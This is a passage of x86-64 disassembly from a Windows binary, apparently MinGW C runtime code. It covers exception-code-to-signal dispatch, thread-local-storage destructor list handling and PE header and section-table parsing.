    6968b8ff:	e8 ac 09 00 00       	call   0x6968c2b0
    6968b904:	31 c0                	xor    %eax,%eax
    6968b906:	48 83 c4 28          	add    $0x28,%rsp
    6968b90a:	c3                   	ret
    6968b90b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    6968b910:	31 d2                	xor    %edx,%edx
    6968b912:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968b917:	e8 1c 0a 00 00       	call   0x6968c338
    6968b91c:	48 83 f8 01          	cmp    $0x1,%rax
    6968b920:	0f 85 5b ff ff ff    	jne    0x6968b881
    6968b926:	ba 01 00 00 00       	mov    $0x1,%edx
    6968b92b:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968b930:	e8 03 0a 00 00       	call   0x6968c338
    6968b935:	31 c0                	xor    %eax,%eax
    6968b937:	e9 07 ff ff ff       	jmp    0x6968b843
    6968b93c:	0f 1f 40 00          	nopl   0x0(%rax)
    6968b940:	ba 01 00 00 00       	mov    $0x1,%edx
    6968b945:	b9 04 00 00 00       	mov    $0x4,%ecx
    6968b94a:	e8 e9 09 00 00       	call   0x6968c338
    6968b94f:	31 c0                	xor    %eax,%eax
    6968b951:	e9 ed fe ff ff       	jmp    0x6968b843
    6968b956:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968b95d:	00 00 00 
    6968b960:	ba 01 00 00 00       	mov    $0x1,%edx
    6968b965:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6968b96a:	e8 c9 09 00 00       	call   0x6968c338
    6968b96f:	31 c0                	xor    %eax,%eax
    6968b971:	e9 cd fe ff ff       	jmp    0x6968b843
    6968b976:	b8 04 00 00 00       	mov    $0x4,%eax
    6968b97b:	e9 c3 fe ff ff       	jmp    0x6968b843
    6968b980:	41 54                	push   %r12
    6968b982:	55                   	push   %rbp
    6968b983:	57                   	push   %rdi
    6968b984:	56                   	push   %rsi
    6968b985:	53                   	push   %rbx
    6968b986:	48 83 ec 20          	sub    $0x20,%rsp
    6968b98a:	e8 91 07 00 00       	call   0x6968c120
    6968b98f:	48 89 c5             	mov    %rax,%rbp
    6968b992:	8b 05 70 ec 0e 00    	mov    0xeec70(%rip),%eax        # 0x6977a608
    6968b998:	85 c0                	test   %eax,%eax
    6968b99a:	75 25                	jne    0x6968b9c1
    6968b99c:	48 85 ed             	test   %rbp,%rbp
    6968b99f:	74 20                	je     0x6968b9c1
    6968b9a1:	48 8d 0d a8 a0 0e 00 	lea    0xea0a8(%rip),%rcx        # 0x69775a50
    6968b9a8:	c7 05 56 ec 0e 00 01 	movl   $0x1,0xeec56(%rip)        # 0x6977a608
    6968b9af:	00 00 00 
    6968b9b2:	e8 a9 05 00 00       	call   0x6968bf60
    6968b9b7:	48 85 c0             	test   %rax,%rax
    6968b9ba:	74 14                	je     0x6968b9d0
    6968b9bc:	b8 01 00 00 00       	mov    $0x1,%eax
    6968b9c1:	48 83 c4 20          	add    $0x20,%rsp
    6968b9c5:	5b                   	pop    %rbx
    6968b9c6:	5e                   	pop    %rsi
    6968b9c7:	5f                   	pop    %rdi
    6968b9c8:	5d                   	pop    %rbp
    6968b9c9:	41 5c                	pop    %r12
    6968b9cb:	c3                   	ret
    6968b9cc:	0f 1f 40 00          	nopl   0x0(%rax)
    6968b9d0:	48 8d 1d 49 ed 0e 00 	lea    0xeed49(%rip),%rbx        # 0x6977a720
    6968b9d7:	b9 30 00 00 00       	mov    $0x30,%ecx
    6968b9dc:	31 f6                	xor    %esi,%esi
    6968b9de:	48 8d 15 3b ec 0e 00 	lea    0xeec3b(%rip),%rdx        # 0x6977a620
    6968b9e5:	48 89 df             	mov    %rbx,%rdi
    6968b9e8:	f3 48 ab             	rep stos %rax,(%rdi)
    6968b9eb:	4c 8d 25 ee fd ff ff 	lea    -0x212(%rip),%r12        # 0x6968b7e0
    6968b9f2:	b9 20 00 00 00       	mov    $0x20,%ecx
    6968b9f7:	48 89 d7             	mov    %rdx,%rdi
    6968b9fa:	f3 48 ab             	rep stos %rax,(%rdi)
    6968b9fd:	49 29 ec             	sub    %rbp,%r12
    6968ba00:	48 89 d7             	mov    %rdx,%rdi
    6968ba03:	eb 2e                	jmp    0x6968ba33
    6968ba05:	c6 07 09             	movb   $0x9,(%rdi)
    6968ba08:	48 83 c6 01          	add    $0x1,%rsi
    6968ba0c:	48 83 c3 0c          	add    $0xc,%rbx
    6968ba10:	44 89 67 04          	mov    %r12d,0x4(%rdi)
    6968ba14:	8b 48 0c             	mov    0xc(%rax),%ecx
    6968ba17:	89 4b f4             	mov    %ecx,-0xc(%rbx)
    6968ba1a:	03 48 08             	add    0x8(%rax),%ecx
    6968ba1d:	48 89 f8             	mov    %rdi,%rax
    6968ba20:	48 83 c7 08          	add    $0x8,%rdi
    6968ba24:	48 29 e8             	sub    %rbp,%rax
    6968ba27:	89 43 fc             	mov    %eax,-0x4(%rbx)
    6968ba2a:	89 4b f8             	mov    %ecx,-0x8(%rbx)
    6968ba2d:	48 83 fe 20          	cmp    $0x20,%rsi
    6968ba31:	74 32                	je     0x6968ba65
    6968ba33:	48 89 f1             	mov    %rsi,%rcx
    6968ba36:	e8 75 06 00 00       	call   0x6968c0b0
    6968ba3b:	48 85 c0             	test   %rax,%rax
    6968ba3e:	75 c5                	jne    0x6968ba05
    6968ba40:	48 85 f6             	test   %rsi,%rsi
    6968ba43:	89 f2                	mov    %esi,%edx
    6968ba45:	0f 84 71 ff ff ff    	je     0x6968b9bc
    6968ba4b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    6968ba50:	48 8d 0d c9 ec 0e 00 	lea    0xeecc9(%rip),%rcx        # 0x6977a720
    6968ba57:	49 89 e8             	mov    %rbp,%r8
    6968ba5a:	ff 15 f4 27 10 00    	call   *0x1027f4(%rip)        # 0x6978e254
    6968ba60:	e9 57 ff ff ff       	jmp    0x6968b9bc
    6968ba65:	ba 20 00 00 00       	mov    $0x20,%edx
    6968ba6a:	eb e4                	jmp    0x6968ba50
    6968ba6c:	0f 1f 40 00          	nopl   0x0(%rax)
    6968ba70:	53                   	push   %rbx
    6968ba71:	48 83 ec 20          	sub    $0x20,%rsp
    6968ba75:	48 8b 11             	mov    (%rcx),%rdx
    6968ba78:	8b 02                	mov    (%rdx),%eax
    6968ba7a:	48 89 cb             	mov    %rcx,%rbx
    6968ba7d:	89 c1                	mov    %eax,%ecx
    6968ba7f:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
    6968ba85:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
    6968ba8b:	0f 84 bf 00 00 00    	je     0x6968bb50
    6968ba91:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
    6968ba96:	77 68                	ja     0x6968bb00
    6968ba98:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
    6968ba9d:	73 7c                	jae    0x6968bb1b
    6968ba9f:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
    6968baa4:	0f 84 b0 00 00 00    	je     0x6968bb5a
    6968baaa:	0f 87 f4 00 00 00    	ja     0x6968bba4
    6968bab0:	3d 02 00 00 80       	cmp    $0x80000002,%eax
    6968bab5:	0f 84 9f 00 00 00    	je     0x6968bb5a
    6968babb:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
    6968bac0:	75 1f                	jne    0x6968bae1
    6968bac2:	31 d2                	xor    %edx,%edx
    6968bac4:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6968bac9:	e8 6a 08 00 00       	call   0x6968c338
    6968bace:	48 83 f8 01          	cmp    $0x1,%rax
    6968bad2:	0f 84 51 01 00 00    	je     0x6968bc29
    6968bad8:	48 85 c0             	test   %rax,%rax
    6968badb:	0f 85 0f 01 00 00    	jne    0x6968bbf0
    6968bae1:	48 8b 05 18 eb 0e 00 	mov    0xeeb18(%rip),%rax        # 0x6977a600
    6968bae8:	48 85 c0             	test   %rax,%rax
    6968baeb:	0f 84 10 01 00 00    	je     0x6968bc01
    6968baf1:	48 89 d9             	mov    %rbx,%rcx
    6968baf4:	48 83 c4 20          	add    $0x20,%rsp
    6968baf8:	5b                   	pop    %rbx
    6968baf9:	48 ff e0             	rex.W jmp *%rax
    6968bafc:	0f 1f 40 00          	nopl   0x0(%rax)
    6968bb00:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
    6968bb05:	0f 84 b5 00 00 00    	je     0x6968bbc0
    6968bb0b:	77 58                	ja     0x6968bb65
    6968bb0d:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
    6968bb12:	74 46                	je     0x6968bb5a
    6968bb14:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
    6968bb19:	75 c6                	jne    0x6968bae1
    6968bb1b:	31 d2                	xor    %edx,%edx
    6968bb1d:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968bb22:	e8 11 08 00 00       	call   0x6968c338
    6968bb27:	48 83 f8 01          	cmp    $0x1,%rax
    6968bb2b:	0f 84 df 00 00 00    	je     0x6968bc10
    6968bb31:	48 85 c0             	test   %rax,%rax
    6968bb34:	74 ab                	je     0x6968bae1
    6968bb36:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968bb3b:	ff d0                	call   *%rax
    6968bb3d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6968bb42:	48 83 c4 20          	add    $0x20,%rsp
    6968bb46:	5b                   	pop    %rbx
    6968bb47:	c3                   	ret
    6968bb48:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6968bb4f:	00 
    6968bb50:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
    6968bb54:	0f 85 37 ff ff ff    	jne    0x6968ba91
    6968bb5a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6968bb5f:	48 83 c4 20          	add    $0x20,%rsp
    6968bb63:	5b                   	pop    %rbx
    6968bb64:	c3                   	ret
    6968bb65:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
    6968bb6a:	74 ee                	je     0x6968bb5a
    6968bb6c:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
    6968bb71:	0f 85 6a ff ff ff    	jne    0x6968bae1
    6968bb77:	31 d2                	xor    %edx,%edx
    6968bb79:	b9 04 00 00 00       	mov    $0x4,%ecx
    6968bb7e:	e8 b5 07 00 00       	call   0x6968c338
    6968bb83:	48 83 f8 01          	cmp    $0x1,%rax
    6968bb87:	0f 84 b3 00 00 00    	je     0x6968bc40
    6968bb8d:	48 85 c0             	test   %rax,%rax
    6968bb90:	0f 84 4b ff ff ff    	je     0x6968bae1
    6968bb96:	b9 04 00 00 00       	mov    $0x4,%ecx
    6968bb9b:	ff d0                	call   *%rax
    6968bb9d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6968bba2:	eb 9e                	jmp    0x6968bb42
    6968bba4:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
    6968bba9:	74 cc                	je     0x6968bb77
    6968bbab:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
    6968bbb0:	0f 85 2b ff ff ff    	jne    0x6968bae1
    6968bbb6:	eb a2                	jmp    0x6968bb5a
    6968bbb8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6968bbbf:	00 
    6968bbc0:	31 d2                	xor    %edx,%edx
    6968bbc2:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968bbc7:	e8 6c 07 00 00       	call   0x6968c338
    6968bbcc:	48 83 f8 01          	cmp    $0x1,%rax
    6968bbd0:	0f 85 5b ff ff ff    	jne    0x6968bb31
    6968bbd6:	ba 01 00 00 00       	mov    $0x1,%edx
    6968bbdb:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968bbe0:	e8 53 07 00 00       	call   0x6968c338
    6968bbe5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6968bbea:	e9 53 ff ff ff       	jmp    0x6968bb42
    6968bbef:	90                   	nop
    6968bbf0:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6968bbf5:	ff d0                	call   *%rax
    6968bbf7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6968bbfc:	e9 41 ff ff ff       	jmp    0x6968bb42
    6968bc01:	31 c0                	xor    %eax,%eax
    6968bc03:	e9 3a ff ff ff       	jmp    0x6968bb42
    6968bc08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6968bc0f:	00 
    6968bc10:	ba 01 00 00 00       	mov    $0x1,%edx
    6968bc15:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968bc1a:	e8 19 07 00 00       	call   0x6968c338
    6968bc1f:	e8 8c 06 00 00       	call   0x6968c2b0
    6968bc24:	e9 31 ff ff ff       	jmp    0x6968bb5a
    6968bc29:	ba 01 00 00 00       	mov    $0x1,%edx
    6968bc2e:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6968bc33:	e8 00 07 00 00       	call   0x6968c338
    6968bc38:	83 c8 ff             	or     $0xffffffff,%eax
    6968bc3b:	e9 02 ff ff ff       	jmp    0x6968bb42
    6968bc40:	ba 01 00 00 00       	mov    $0x1,%edx
    6968bc45:	b9 04 00 00 00       	mov    $0x4,%ecx
    6968bc4a:	e8 e9 06 00 00       	call   0x6968c338
    6968bc4f:	83 c8 ff             	or     $0xffffffff,%eax
    6968bc52:	e9 eb fe ff ff       	jmp    0x6968bb42
    6968bc57:	90                   	nop
    6968bc58:	90                   	nop
    6968bc59:	90                   	nop
    6968bc5a:	90                   	nop
    6968bc5b:	90                   	nop
    6968bc5c:	90                   	nop
    6968bc5d:	90                   	nop
    6968bc5e:	90                   	nop
    6968bc5f:	90                   	nop
    6968bc60:	55                   	push   %rbp
    6968bc61:	57                   	push   %rdi
    6968bc62:	56                   	push   %rsi
    6968bc63:	53                   	push   %rbx
    6968bc64:	48 83 ec 28          	sub    $0x28,%rsp
    6968bc68:	48 8d 0d 51 ec 0e 00 	lea    0xeec51(%rip),%rcx        # 0x6977a8c0
    6968bc6f:	ff 15 7f 25 10 00    	call   *0x10257f(%rip)        # 0x6978e1f4
    6968bc75:	48 8b 1d 24 ec 0e 00 	mov    0xeec24(%rip),%rbx        # 0x6977a8a0
    6968bc7c:	48 85 db             	test   %rbx,%rbx
    6968bc7f:	74 33                	je     0x6968bcb4
    6968bc81:	48 8b 2d 04 26 10 00 	mov    0x102604(%rip),%rbp        # 0x6978e28c
    6968bc88:	48 8b 3d 85 25 10 00 	mov    0x102585(%rip),%rdi        # 0x6978e214
    6968bc8f:	90                   	nop
    6968bc90:	8b 0b                	mov    (%rbx),%ecx
    6968bc92:	ff d5                	call   *%rbp
    6968bc94:	48 89 c6             	mov    %rax,%rsi
    6968bc97:	ff d7                	call   *%rdi
    6968bc99:	85 c0                	test   %eax,%eax
    6968bc9b:	75 0e                	jne    0x6968bcab
    6968bc9d:	48 85 f6             	test   %rsi,%rsi
    6968bca0:	74 09                	je     0x6968bcab
    6968bca2:	48 8b 43 08          	mov    0x8(%rbx),%rax
    6968bca6:	48 89 f1             	mov    %rsi,%rcx
    6968bca9:	ff d0                	call   *%rax
    6968bcab:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
    6968bcaf:	48 85 db             	test   %rbx,%rbx
    6968bcb2:	75 dc                	jne    0x6968bc90
    6968bcb4:	48 8d 0d 05 ec 0e 00 	lea    0xeec05(%rip),%rcx        # 0x6977a8c0
    6968bcbb:	48 83 c4 28          	add    $0x28,%rsp
    6968bcbf:	5b                   	pop    %rbx
    6968bcc0:	5e                   	pop    %rsi
    6968bcc1:	5f                   	pop    %rdi
    6968bcc2:	5d                   	pop    %rbp
    6968bcc3:	48 ff 25 72 25 10 00 	rex.W jmp *0x102572(%rip)        # 0x6978e23c
    6968bcca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6968bcd0:	55                   	push   %rbp
    6968bcd1:	57                   	push   %rdi
    6968bcd2:	56                   	push   %rsi
    6968bcd3:	53                   	push   %rbx
    6968bcd4:	48 83 ec 28          	sub    $0x28,%rsp
    6968bcd8:	8b 05 ca eb 0e 00    	mov    0xeebca(%rip),%eax        # 0x6977a8a8
    6968bcde:	31 f6                	xor    %esi,%esi
    6968bce0:	85 c0                	test   %eax,%eax
    6968bce2:	89 cd                	mov    %ecx,%ebp
    6968bce4:	48 89 d7             	mov    %rdx,%rdi
    6968bce7:	75 0b                	jne    0x6968bcf4
    6968bce9:	89 f0                	mov    %esi,%eax
    6968bceb:	48 83 c4 28          	add    $0x28,%rsp
    6968bcef:	5b                   	pop    %rbx
    6968bcf0:	5e                   	pop    %rsi
    6968bcf1:	5f                   	pop    %rdi
    6968bcf2:	5d                   	pop    %rbp
    6968bcf3:	c3                   	ret
    6968bcf4:	ba 18 00 00 00       	mov    $0x18,%edx
    6968bcf9:	b9 01 00 00 00       	mov    $0x1,%ecx
    6968bcfe:	e8 55 06 00 00       	call   0x6968c358
    6968bd03:	48 85 c0             	test   %rax,%rax
    6968bd06:	48 89 c3             	mov    %rax,%rbx
    6968bd09:	74 3d                	je     0x6968bd48
    6968bd0b:	89 28                	mov    %ebp,(%rax)
    6968bd0d:	48 8d 0d ac eb 0e 00 	lea    0xeebac(%rip),%rcx        # 0x6977a8c0
    6968bd14:	48 89 78 08          	mov    %rdi,0x8(%rax)
    6968bd18:	ff 15 d6 24 10 00    	call   *0x1024d6(%rip)        # 0x6978e1f4
    6968bd1e:	48 8b 05 7b eb 0e 00 	mov    0xeeb7b(%rip),%rax        # 0x6977a8a0
    6968bd25:	48 8d 0d 94 eb 0e 00 	lea    0xeeb94(%rip),%rcx        # 0x6977a8c0
    6968bd2c:	48 89 1d 6d eb 0e 00 	mov    %rbx,0xeeb6d(%rip)        # 0x6977a8a0
    6968bd33:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6968bd37:	ff 15 ff 24 10 00    	call   *0x1024ff(%rip)        # 0x6978e23c
    6968bd3d:	89 f0                	mov    %esi,%eax
    6968bd3f:	48 83 c4 28          	add    $0x28,%rsp
    6968bd43:	5b                   	pop    %rbx
    6968bd44:	5e                   	pop    %rsi
    6968bd45:	5f                   	pop    %rdi
    6968bd46:	5d                   	pop    %rbp
    6968bd47:	c3                   	ret
    6968bd48:	be ff ff ff ff       	mov    $0xffffffff,%esi
    6968bd4d:	eb 9a                	jmp    0x6968bce9
    6968bd4f:	90                   	nop
    6968bd50:	53                   	push   %rbx
    6968bd51:	48 83 ec 20          	sub    $0x20,%rsp
    6968bd55:	8b 05 4d eb 0e 00    	mov    0xeeb4d(%rip),%eax        # 0x6977a8a8
    6968bd5b:	85 c0                	test   %eax,%eax
    6968bd5d:	89 cb                	mov    %ecx,%ebx
    6968bd5f:	75 0f                	jne    0x6968bd70
    6968bd61:	31 c0                	xor    %eax,%eax
    6968bd63:	48 83 c4 20          	add    $0x20,%rsp
    6968bd67:	5b                   	pop    %rbx
    6968bd68:	c3                   	ret
    6968bd69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    6968bd70:	48 8d 0d 49 eb 0e 00 	lea    0xeeb49(%rip),%rcx        # 0x6977a8c0
    6968bd77:	ff 15 77 24 10 00    	call   *0x102477(%rip)        # 0x6978e1f4
    6968bd7d:	48 8b 05 1c eb 0e 00 	mov    0xeeb1c(%rip),%rax        # 0x6977a8a0
    6968bd84:	48 85 c0             	test   %rax,%rax
    6968bd87:	74 1a                	je     0x6968bda3
    6968bd89:	8b 10                	mov    (%rax),%edx
    6968bd8b:	39 d3                	cmp    %edx,%ebx
    6968bd8d:	75 0b                	jne    0x6968bd9a
    6968bd8f:	eb 4f                	jmp    0x6968bde0
    6968bd91:	8b 11                	mov    (%rcx),%edx
    6968bd93:	39 da                	cmp    %ebx,%edx
    6968bd95:	74 29                	je     0x6968bdc0
    6968bd97:	48 89 c8             	mov    %rcx,%rax
    6968bd9a:	48 8b 48 10          	mov    0x10(%rax),%rcx
    6968bd9e:	48 85 c9             	test   %rcx,%rcx
    6968bda1:	75 ee                	jne    0x6968bd91
    6968bda3:	48 8d 0d 16 eb 0e 00 	lea    0xeeb16(%rip),%rcx        # 0x6977a8c0
    6968bdaa:	ff 15 8c 24 10 00    	call   *0x10248c(%rip)        # 0x6978e23c
    6968bdb0:	31 c0                	xor    %eax,%eax
    6968bdb2:	48 83 c4 20          	add    $0x20,%rsp
    6968bdb6:	5b                   	pop    %rbx
    6968bdb7:	c3                   	ret
    6968bdb8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6968bdbf:	00 
    6968bdc0:	48 8b 51 10          	mov    0x10(%rcx),%rdx
    6968bdc4:	48 89 50 10          	mov    %rdx,0x10(%rax)
    6968bdc8:	e8 7b 05 00 00       	call   0x6968c348
    6968bdcd:	48 8d 0d ec ea 0e 00 	lea    0xeeaec(%rip),%rcx        # 0x6977a8c0
    6968bdd4:	ff 15 62 24 10 00    	call   *0x102462(%rip)        # 0x6978e23c
    6968bdda:	eb d4                	jmp    0x6968bdb0
    6968bddc:	0f 1f 40 00          	nopl   0x0(%rax)
    6968bde0:	48 8b 50 10          	mov    0x10(%rax),%rdx
    6968bde4:	48 89 c1             	mov    %rax,%rcx
    6968bde7:	48 89 15 b2 ea 0e 00 	mov    %rdx,0xeeab2(%rip)        # 0x6977a8a0
    6968bdee:	eb d8                	jmp    0x6968bdc8
    6968bdf0:	53                   	push   %rbx
    6968bdf1:	48 83 ec 20          	sub    $0x20,%rsp
    6968bdf5:	83 fa 01             	cmp    $0x1,%edx
    6968bdf8:	0f 84 92 00 00 00    	je     0x6968be90
    6968bdfe:	72 30                	jb     0x6968be30
    6968be00:	83 fa 02             	cmp    $0x2,%edx
    6968be03:	74 1b                	je     0x6968be20
    6968be05:	83 fa 03             	cmp    $0x3,%edx
    6968be08:	75 1b                	jne    0x6968be25
    6968be0a:	8b 05 98 ea 0e 00    	mov    0xeea98(%rip),%eax        # 0x6977a8a8
    6968be10:	85 c0                	test   %eax,%eax
    6968be12:	74 11                	je     0x6968be25
    6968be14:	e8 47 fe ff ff       	call   0x6968bc60
    6968be19:	eb 0a                	jmp    0x6968be25
    6968be1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    6968be20:	e8 8b 04 00 00       	call   0x6968c2b0
    6968be25:	b8 01 00 00 00       	mov    $0x1,%eax
    6968be2a:	48 83 c4 20          	add    $0x20,%rsp
    6968be2e:	5b                   	pop    %rbx
    6968be2f:	c3                   	ret
    6968be30:	8b 05 72 ea 0e 00    	mov    0xeea72(%rip),%eax        # 0x6977a8a8
    6968be36:	85 c0                	test   %eax,%eax
    6968be38:	0f 85 82 00 00 00    	jne    0x6968bec0
    6968be3e:	8b 05 64 ea 0e 00    	mov    0xeea64(%rip),%eax        # 0x6977a8a8
    6968be44:	83 f8 01             	cmp    $0x1,%eax
    6968be47:	75 dc                	jne    0x6968be25
    6968be49:	48 8b 0d 50 ea 0e 00 	mov    0xeea50(%rip),%rcx        # 0x6977a8a0
    6968be50:	48 85 c9             	test   %rcx,%rcx
    6968be53:	74 11                	je     0x6968be66
    6968be55:	48 8b 59 10          	mov    0x10(%rcx),%rbx
    6968be59:	e8 ea 04 00 00       	call   0x6968c348
    6968be5e:	48 85 db             	test   %rbx,%rbx
    6968be61:	48 89 d9             	mov    %rbx,%rcx
    6968be64:	75 ef                	jne    0x6968be55
    6968be66:	48 8d 0d 53 ea 0e 00 	lea    0xeea53(%rip),%rcx        # 0x6977a8c0
    6968be6d:	48 c7 05 28 ea 0e 00 	movq   $0x0,0xeea28(%rip)        # 0x6977a8a0
    6968be74:	00 00 00 00 
    6968be78:	c7 05 26 ea 0e 00 00 	movl   $0x0,0xeea26(%rip)        # 0x6977a8a8
    6968be7f:	00 00 00 
    6968be82:	ff 15 64 23 10 00    	call   *0x102364(%rip)        # 0x6978e1ec
    6968be88:	eb 9b                	jmp    0x6968be25
    6968be8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6968be90:	8b 05 12 ea 0e 00    	mov    0xeea12(%rip),%eax        # 0x6977a8a8
    6968be96:	85 c0                	test   %eax,%eax
    6968be98:	74 16                	je     0x6968beb0
    6968be9a:	c7 05 04 ea 0e 00 01 	movl   $0x1,0xeea04(%rip)        # 0x6977a8a8
    6968bea1:	00 00 00 
    6968bea4:	b8 01 00 00 00       	mov    $0x1,%eax
    6968bea9:	48 83 c4 20          	add    $0x20,%rsp
    6968bead:	5b                   	pop    %rbx
    6968beae:	c3                   	ret
    6968beaf:	90                   	nop
    6968beb0:	48 8d 0d 09 ea 0e 00 	lea    0xeea09(%rip),%rcx        # 0x6977a8c0
    6968beb7:	ff 15 77 23 10 00    	call   *0x102377(%rip)        # 0x6978e234
    6968bebd:	eb db                	jmp    0x6968be9a
    6968bebf:	90                   	nop
    6968bec0:	e8 9b fd ff ff       	call   0x6968bc60
    6968bec5:	e9 74 ff ff ff       	jmp    0x6968be3e
    6968beca:	90                   	nop
    6968becb:	90                   	nop
    6968becc:	90                   	nop
    6968becd:	90                   	nop
    6968bece:	90                   	nop
    6968becf:	90                   	nop
    6968bed0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
    6968bed4:	48 01 c1             	add    %rax,%rcx
    6968bed7:	31 c0                	xor    %eax,%eax
    6968bed9:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
    6968bedf:	74 01                	je     0x6968bee2
    6968bee1:	c3                   	ret
    6968bee2:	31 c0                	xor    %eax,%eax
    6968bee4:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
    6968beea:	0f 94 c0             	sete   %al
    6968beed:	c3                   	ret
    6968beee:	66 90                	xchg   %ax,%ax
    6968bef0:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
    6968bef5:	74 09                	je     0x6968bf00
    6968bef7:	31 c0                	xor    %eax,%eax
    6968bef9:	c3                   	ret
    6968befa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6968bf00:	eb ce                	jmp    0x6968bed0
    6968bf02:	0f 1f 40 00          	nopl   0x0(%rax)
    6968bf06:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968bf0d:	00 00 00 
    6968bf10:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
    6968bf14:	48 01 c1             	add    %rax,%rcx
    6968bf17:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
    6968bf1b:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
    6968bf20:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
    6968bf24:	85 c9                	test   %ecx,%ecx
    6968bf26:	74 29                	je     0x6968bf51
    6968bf28:	83 e9 01             	sub    $0x1,%ecx
    6968bf2b:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
    6968bf2f:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
    6968bf34:	44 8b 40 0c          	mov    0xc(%rax),%r8d
    6968bf38:	49 39 d0             	cmp    %rdx,%r8
    6968bf3b:	4c 89 c1             	mov    %r8,%rcx
    6968bf3e:	77 08                	ja     0x6968bf48
    6968bf40:	03 48 08             	add    0x8(%rax),%ecx
    6968bf43:	48 39 d1             	cmp    %rdx,%rcx
    6968bf46:	77 0b                	ja     0x6968bf53
    6968bf48:	48 83 c0 28          	add    $0x28,%rax
    6968bf4c:	4c 39 c8             	cmp    %r9,%rax
    6968bf4f:	75 e3                	jne    0x6968bf34
    6968bf51:	31 c0                	xor    %eax,%eax
    6968bf53:	c3                   	ret
    6968bf54:	66 90                	xchg   %ax,%ax
    6968bf56:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968bf5d:	00 00 00 
    6968bf60:	57                   	push   %rdi
    6968bf61:	56                   	push   %rsi
    6968bf62:	53                   	push   %rbx
    6968bf63:	48 83 ec 20          	sub    $0x20,%rsp
    6968bf67:	48 89 ce             	mov    %rcx,%rsi
    6968bf6a:	e8 c1 03 00 00       	call   0x6968c330
    6968bf6f:	48 83 f8 08          	cmp    $0x8,%rax
    6968bf73:	77 6b                	ja     0x6968bfe0
    6968bf75:	48 8b 15 34 9b 0e 00 	mov    0xe9b34(%rip),%rdx        # 0x69775ab0
    6968bf7c:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
    6968bf81:	75 5d                	jne    0x6968bfe0
    6968bf83:	48 89 d1             	mov    %rdx,%rcx
    6968bf86:	e8 45 ff ff ff       	call   0x6968bed0
    6968bf8b:	85 c0                	test   %eax,%eax
    6968bf8d:	74 51                	je     0x6968bfe0
    6968bf8f:	48 63 4a 3c          	movslq 0x3c(%rdx),%rcx
    6968bf93:	48 01 d1             	add    %rdx,%rcx
    6968bf96:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
    6968bf9a:	48 8d 5c 01 18       	lea    0x18(%rcx,%rax,1),%rbx
    6968bf9f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
    6968bfa3:	85 c0                	test   %eax,%eax
    6968bfa5:	74 39                	je     0x6968bfe0
    6968bfa7:	83 e8 01             	sub    $0x1,%eax
    6968bfaa:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    6968bfae:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
    6968bfb3:	eb 09                	jmp    0x6968bfbe
    6968bfb5:	48 83 c3 28          	add    $0x28,%rbx
    6968bfb9:	48 39 fb             	cmp    %rdi,%rbx
    6968bfbc:	74 22                	je     0x6968bfe0
    6968bfbe:	41 b8 08 00 00 00    	mov    $0x8,%r8d
    6968bfc4:	48 89 f2             	mov    %rsi,%rdx
    6968bfc7:	48 89 d9             	mov    %rbx,%rcx
    6968bfca:	e8 59 03 00 00       	call   0x6968c328
    6968bfcf:	85 c0                	test   %eax,%eax
